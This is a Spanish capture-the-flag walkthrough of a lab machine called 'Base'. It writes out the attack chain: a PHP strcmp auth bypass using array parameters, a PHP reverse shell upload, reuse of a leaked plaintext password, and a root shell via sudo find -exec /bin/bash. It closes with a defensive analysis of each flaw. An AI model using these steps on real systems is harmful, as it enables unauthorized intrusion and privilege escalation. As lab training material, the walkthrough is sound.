# Base
## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```
## Enum
### HTTP
#### Gobuster 
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/_uploaded (Status: 301)
/login (Status: 301)
/server-status (Status: 403)
/static (Status: 301)
```
/login en vez de redirigirnos a login.php o mostrar el login aquí directamente nos lista la carpeta /login donde hay un login.php y un archivo llamado login.php.swp
```
if (strcmp($password, $_POST['password']) == 0) {
  if (strcmp($username , $_POST['username']) == 0) {
  require('config.php');
if (!empty($_POST['username']) && !empty($_POST['password'])) {
  session_start();   
```
Parece un backup del script de login de la pagina, podemos ver que la comparación es vulnerable a type juglling dado que se hace con el operador '==' en lugar del '==='

Bien, para abusar de esta comparacion lo que haremos sera castear los imputs a vectores generando un error que se interpretara como 0  la hora de hacer la compatación, de manera que la request pasara de ser :
```
username=admin&password=admin
```
a ser:
```
username[]=admin&password[]=admin
```
Con esto habriamos entrado

## Exploit
Nada mas entrar tenemos un servicio llamado secret file upload, en este podemos subir archivos php sin ningun problema, subimos la reverse shell de pentest monkey y ya tendriamos un RCE como www-data

## Privesc
Viendo usuarios con acceso via bash tenemos 2:
```
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:John:/home/john:/bin/bash
```
Intentar escalar lateralmente hacia john parece buena idea.

### John

Miramos la contraseña usada realmente para el servicio de login de la web y descubrimos que es la siguiente combinación
```
$username = "admin";
$password = "thisisagoodpassword"
```
Dado que tenmos 2 usuarios no estaria de mas probarla para ambos, con suerte conseguiremos acceder a alaguno debido a reutilizicación de contraseña, afortunadamente para nosotros la contraseña se puede usar para logeranos como john
```
(Aquí es buen momento para dejar la reverse shell y abrir una sesion via ssh como john para tener una shell completamente operativa)
```
### Root
```
User john may run the following commands on base:
    (root : root) /usr/bin/find
```
Con esta configuracion es bien sencillo escalar privilegios
```
john@base:~$ sudo /usr/bin/find . -exec /bin/bash \;
root@base:~#
```

# Analisís de la intrusión
### Broken Auth: PHP Strcmp vulnerable call
https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/
### Unrestricted file upload
El servidor web nos permite subir archivos sin verificar nada al respecto una vez estamos autentificados, esto nos lleva a poder ejecutar codigo php arbitario en el lado del servidor
### Plaintext password
La contraseña, en si es segura y si se hubiera o hubiese hasheado probablemente no la habriamos conseguido crackear en un tiempo corto ya que ni se encuentra en rockyou.txt ni crackstation la tiene almacenada, pero al guardarse en texto plano se nos facilito la tarea y conseguimos logearnos como john
### Password reutilization
Si bien la contraseña era medianamente robusta, la reutilización de la misma en el servicio web y el usuario del sistema nos permitio escalar privilegios lateralmente hasta john
### Privileged find execution
La ejecución privilegiada del comando find por parte de john no permite escalar privilegios de manera ascendente logrando así finalmente ser root en el sistema 
